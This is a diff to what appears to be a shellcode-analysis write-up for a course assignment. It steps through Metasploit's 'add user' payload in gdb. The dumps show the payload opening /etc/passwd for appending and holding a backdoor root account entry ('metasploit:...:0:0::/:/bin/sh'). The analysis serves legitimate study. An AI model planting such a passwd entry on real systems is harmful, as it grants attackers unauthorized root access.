@@ -146,7 +146,7 @@ So right off the bat, the disassembly is quite long. But we don't need to concer
 - There is an ```int 0x80``` instruction at ```0x00404047```. ```eax``` holds ```0x46``` which is the syscall number.
 - The ```push``` instructions at ```0x0040404f```, ```0x00404054``` and ```0x00404059``` look like parameters.
 - Another ```int 0x80``` at ```0x00404063```, with syscall number ```0x5``` in ```eax``` and a pointer to our arguments in ```ebx```.
-- The ```call``` at ```0x00404066``` calls our final shellcode.
+- The ```call``` at ```0x00404066``` is worth looking into.
 
 Alright, so let's start off by checking out the first ```int 0x80```, with the syscall number ```0x46```(70):
 ```
@@ -209,4 +209,60 @@ So ```ecx``` serves as our ```NULLs``` in order to null-terminate the string ```
 0x00404060 <+32>:    inc    ecx           ;ecx=0x1
 0x00404061 <+33>:    mov    ch,0x4        ;ecx=0x401 --> O_WRONLY and O_APPEND
 0x00404063 <+35>:    int    0x80          ;syscall
+0x00404065 <+37>:    xchg   ebx,eax
 ```
+The ```xchng``` after the syscall switches the values stored in ```ebx``` and ```eax```. So ```eax``` has the pointer to our string and ```ebx``` has ```0x3```.
+
+In order to understand what that call at ```0x00404066``` does, I set a breakpoint at the address that it's calling, which is ```0x404093```:
+```nasm
+gdb-peda$ c
+Continuing.
+[----------------------------------registers-----------------------------------]
+EAX: 0xbffff1ac ("/etc//passwd")
+EBX: 0xfffffff3
+ECX: 0x401
+EDX: 0x40201e --> 0x1b010000
+ESI: 0xb7fb8000 --> 0x1dfd6c
+EDI: 0xb7fb8000 --> 0x1dfd6c
+EBP: 0xbffff1d8 --> 0x0
+ESP: 0xbffff1a8 --> 0x40406b ("metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q\374j\004Xj\001X")
+EIP: 0x404093 --> 0xfc518b59
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+=> 0x404093 <code+83>:  pop    ecx
+   0x404094 <code+84>:  mov    edx,DWORD PTR [ecx-0x4]
+   0x404097 <code+87>:  push   0x4
+   0x404099 <code+89>:  pop    eax
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff1a8 --> 0x40406b ("metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q\374j\004Xj\001X")
+0004| 0xbffff1ac ("/etc//passwd")
+0008| 0xbffff1b0 ("//passwd")
+0012| 0xbffff1b4 ("sswd")
+0016| 0xbffff1b8 --> 0x0
+0020| 0xbffff1bc --> 0x4011f9 (<main+80>:       mov    eax,0x0)
+0024| 0xbffff1c0 --> 0x1
+0028| 0xbffff1c4 --> 0xbffff284 --> 0xbffff41d ("/home/kali/Desktop/SLAE_Practice/SLAEx86_Assignments/ass5/shellcode")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+```
+So from the upper half, we can gather that our username and password is stored at ```esp```, and after the ```call``` executes, it will be popped into ```ecx```:
+```nasm
+gdb-peda$ stepi
+[----------------------------------registers-----------------------------------]
+EAX: 0xbffff1ac ("/etc//passwd")
+EBX: 0xfffffff3
+ECX: 0x40406b ("metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q\374j\004Xj\001X")
+EDX: 0x40201e --> 0x1b010000
+ESI: 0xb7fb8000 --> 0x1dfd6c
+EDI: 0xb7fb8000 --> 0x1dfd6c
+EBP: 0xbffff1d8 --> 0x0
+ESP: 0xbffff1ac ("/etc//passwd")
+EIP: 0x404094 --> 0x6afc518b
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+=> 0x404094 <code+84>:  mov    edx,DWORD PTR [ecx-0x4]
+   0x404097 <code+87>:  push   0x4
+   0x404099 <code+89>:  pop    eax
+   0x40409a <code+90>:  int    0x80
+```
+  
